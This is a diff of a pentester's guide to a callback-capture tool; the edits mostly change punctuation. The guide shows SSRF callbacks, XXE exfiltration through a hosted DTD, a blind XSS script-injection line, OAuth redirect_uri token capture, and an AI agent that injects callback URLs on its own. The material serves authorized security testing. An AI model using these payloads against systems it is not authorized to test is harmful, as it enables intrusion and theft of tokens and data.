@@ -15,13 +15,13 @@ Three nouns and you have the whole tool:
   it, every address at it. `https://black-hole.example/anything` is captured;
   `anything@black-hole.example` is captured. Nothing needs to be created first.
 - An **endpoint** is a row you add to change what a *specific* path answers with.
-  Without one, a path answers `404! Not Found` — and the request is still
+  Without one, a path answers `404! Not Found`, and the request is still
   captured. Endpoints exist to serve a target something, not to enable capture.
 - A **capture** is the stored request or email. Requests keep method, full URL,
   IP, every header and the body. Emails keep the verbatim message, including
   attachments.
 
-So the default posture — deploy and do nothing else — already catches every
+So the default posture, deploy and do nothing else, already catches every
 callback. You only configure something when the target needs an *answer*.
 
 Two other useful facts:
@@ -40,8 +40,8 @@ Two other useful facts:
    want as the default. It is remembered per browser.
 2. **Know your two payload shapes.** `https://<host>/<anything>` for HTTP
    callbacks, `<anything>@<host>` for email. Use a distinct path or local-part per
-   test — `/ssrf-login-avatar`, `xxe-dtd@…` — so a captured hit names its own
-   test when you come back to it a day later.
+   test, so a captured hit names its own test when you come back to it a day
+   later. `/ssrf-login-avatar`, `xxe-dtd@…`, that sort of thing.
 3. **Copy URLs from the list.** The leading icon on an Endpoints row copies the
    endpoint's full URL to your clipboard, using the host you selected on Home.
 
@@ -55,7 +55,7 @@ into a labeled result set instead of a pile of `/test` hits.
 The base case: something server-side fetches a URL, and you need proof.
 
 1. Send `https://<host>/ssrf-<injection-point>` in the parameter under test. No
-   setup required — an unconfigured path still captures, and answers `404`.
+   setup required: an unconfigured path still captures, and answers `404`.
 2. Open **Requests**. Search or pin the path fragment.
 3. Open the row.
 
@@ -63,10 +63,10 @@ What the capture tells you, beyond "it fired":
 
 | Field | What it is worth |
 |---|---|
-| `ip` | Egress IP of the fetching host — often a cloud NAT or a proxy you can name in the finding |
+| `ip` | Egress IP of the fetching host, often a cloud NAT or a proxy you can name in the finding |
 | `User-Agent` | Frequently identifies the library and version (`python-requests/2.31`, `Java/17`, `curl/8`), which narrows the sink |
 | Headers | Internal tracing headers, service names, and sometimes an `Authorization` or cookie the target leaked |
-| Body | Present when the sink does a POST — occasionally the whole document it was told to send |
+| Body | Present when the sink does a POST, occasionally the whole document it was told to send |
 | `ts` vs your request | Immediate = synchronous fetch; minutes later = a queue or scheduled job, which changes the exploit story |
 
 Pin the path in the search bar and it stays highlighted with a color ribbon
@@ -75,7 +75,7 @@ across reloads while you keep testing.
 ## Control the response (redirects and metadata)
 
 When the target has to follow your response somewhere, create a **text endpoint**
-(**Endpoints → + New**) — text endpoints own their status and headers.
+(**Endpoints → + New**), because text endpoints own their status and headers.
 
 **Redirect into a filter bypass**, for SSRF that validates the first URL only:
 
@@ -103,8 +103,8 @@ Headers  Access-Control-Allow-Origin: *
          Access-Control-Allow-Credentials: true
 ```
 
-A file-backed endpoint cannot do any of these — uploads force `200` and their own
-content type. Anything you need a custom status or header for is a text endpoint.
+A file-backed endpoint cannot do any of these, since uploads force `200` and
+their own content type. Anything you need a custom status or header for is a text endpoint.
 
 ## Host a DTD for XXE exfiltration
 
@@ -123,15 +123,15 @@ request carrying the data.
    ```
 
 2. Point the target's parser at `https://<host>/x/e.dtd`.
-3. Watch **Requests** for the `/x/out` hit — the exfiltrated content arrives in
+3. Watch **Requests** for the `/x/out` hit. The exfiltrated content arrives in
    the query string, which is stored as part of the full URL.
 
 Long or newline-bearing content breaks a query-string channel; when it does, have
 the second entity POST instead and read it from the request **body**, which has no
 such limit.
 
-Anything expressible as text — DTD, XML, JSON, JavaScript, an SVG, a
-`.well-known` document — is a text endpoint. Reach for an upload only for real
+Anything expressible as text is a text endpoint: DTD, XML, JSON, JavaScript, an
+SVG, a `.well-known` document. Reach for an upload only for real
 binaries ([below](#host-a-file-payload)).
 
 ## Catch a blind XSS beacon
@@ -148,7 +148,7 @@ binaries ([below](#host-a-file-payload)).
 2. Inject `<script src="https://<host>/x/b.js"></script>` (or an
    `import('https://<host>/x/b.js')` variant) into the stored field.
 3. Every execution shows up twice in **Requests**: the script fetch, then the
-   beacon. The beacon's `Referer` header tells you *which page* executed it —
+   beacon. The beacon's `Referer` header tells you *which page* executed it,
    often an internal admin URL you had no other way to learn.
 
 `sendBeacon` survives navigation better than `fetch` for a one-shot exfil. If the
@@ -157,7 +157,7 @@ reached a renderer.
 
 ## Drive email flows: signup, reset, verification
 
-Every address at a mail-enabled black hole is live. There is nothing to create —
+Every address at a mail-enabled black hole is live. There is nothing to create, so
 invent an address per test.
 
 1. Use `whatever+tag@<host>` in the target's signup, invite or reset form.
@@ -169,7 +169,7 @@ invent an address per test.
 What this unlocks that a normal inbox does not:
 
 - **Unlimited identities** for testing tenant isolation, invite flows, and
-  "one account per email" assumptions — same domain, infinite local-parts.
+  "one account per email" assumptions. Same domain, infinite local-parts.
 - **Full headers** for the mail-security half of a report: `Received` chain, SPF
   / DKIM / DMARC results, the real sending infrastructure.
 - **The raw message** via **Download Raw**, which is what you attach as evidence
@@ -185,7 +185,7 @@ silenced with the [email blacklist](#keep-the-noise-down).
 
 Registered-URI validation is often prefix-based, or absent.
 
-1. Stage the landing page as an endpoint — `/-/oauth/cb` if you want an agent to
+1. Stage the landing page as an endpoint, `/-/oauth/cb` if you want an agent to
    be able to manage it, any path otherwise:
 
    ```
@@ -196,8 +196,8 @@ Registered-URI validation is often prefix-based, or absent.
    ```
 
 2. Put `https://<host>/-/oauth/cb` in `redirect_uri` and run the flow.
-3. The captured request holds the whole thing: `code`, `state`, and — with an
-   implicit or hybrid flow — the token itself in the URL. Confirm on the capture,
+3. The captured request holds the whole thing: `code`, `state`, and with an implicit or hybrid flow, the
+   token itself in the URL. Confirm on the capture,
    not on a browser screenshot; the URL fragment behavior differs.
 
 The same shape proves open redirects (does the target bounce a browser to your
@@ -206,7 +206,7 @@ from the page before?).
 
 ## Host a file payload
 
-For real binaries — an archive, a compiled artifact, a PDF, a font, a signed
+For real binaries: an archive, a compiled artifact, a PDF, a font, a signed
 blob, an image with something appended. Open **Endpoints → + New**, set the path,
 then attach the file under **FILE**.
 
@@ -220,7 +220,7 @@ then attach the file under **FILE**.
   text endpoint and deletes the object.
 
 Uploads are a human action by design. An agent can see that an endpoint is
-file-backed but cannot read, replace or delete it — so a payload you staged is
+file-backed but cannot read, replace or delete it, so a payload you staged is
 never destroyed by automation.
 
 ## Hand the engagement to an agent
@@ -238,8 +238,8 @@ message by id, your configured black holes, and create / read / update / delete
 over endpoints under the reserved `/-/*` path space.
 
 In practice this means you can say *"probe every parameter on this endpoint for
-SSRF and tell me which ones called back"* and the agent closes the loop itself —
-it builds the callback URL, injects it, then polls `requests_recent_1hr` for the
+SSRF and tell me which ones called back"* and the agent closes the loop itself.
+It builds the callback URL, injects it, then polls `requests_recent_1hr` for the
 hit.
 
 The guardrails are worth knowing so you can predict what it will do:
@@ -258,9 +258,9 @@ Full surface: [internals/autopilot](../internals/autopilot.md).
 A public hostname attracts scanners within hours of its certificate appearing in
 the transparency logs. Two filters, both under **Settings**:
 
-- **IP blacklist** — a matching request gets `403` immediately. Nothing is
+- **IP blacklist.** A matching request gets `403` immediately. Nothing is
   stored, and the endpoint table is never consulted.
-- **Email blacklist** — a matching sender is rejected at SMTP level, so their
+- **Email blacklist.** A matching sender is rejected at SMTP level, so their
   server generates the bounce. Nothing is stored.
 
 Both are exact-match, and the workers cache each list for up to **60 minutes**, so
@@ -269,7 +269,7 @@ filter, not a security control: the sender address in a mail header is trivially
 forged.
 
 Rather than blacklisting a busy scanner, it is often easier to pin your own test
-paths in the search bar — the noise stays captured but out of your way.
+paths in the search bar. The noise stays captured but out of your way.
 
 ## Evidence and clean-up
 
@@ -279,7 +279,7 @@ paths in the search bar — the noise stays captured but out of your way.
   the retention worker and kept indefinitely, while everything else ages out.
 - **Download Raw** on an email gives you the verbatim `.eml` for the report
   appendix.
-- Screenshot the capture modal, not the list — it carries the timestamp, the
+- Screenshot the capture modal, not the list. It carries the timestamp, the
   full URL and the headers that make the proof legible.
 
 **At the end**
@@ -302,12 +302,12 @@ storage, keep retention short, and purge when the report ships.
 
 | You want to know | Look at |
 |---|---|
-| Did the sink fire at all? | **Requests** — any hit on your path |
+| Did the sink fire at all? | **Requests**, any hit on your path |
 | What is the target's egress IP? | Request `ip` |
 | What software made the request? | Request `User-Agent`, plus header order |
 | Did it leak a token or an internal URL? | Request headers, query string, body |
 | Which page executed my payload? | Request `Referer` |
-| What did the application actually email? | **Emails** — headers, HTML body, attachments |
+| What did the application actually email? | **Emails**: headers, HTML body, attachments |
 | Is their mail authentication sound? | Email headers: `Received`, SPF, DKIM, DMARC |
 | Did the OAuth flow hand me a code? | Request URL on your `redirect_uri` path |
 | Is anything still staged from last week? | **Endpoints**, and `./a51 purge` |
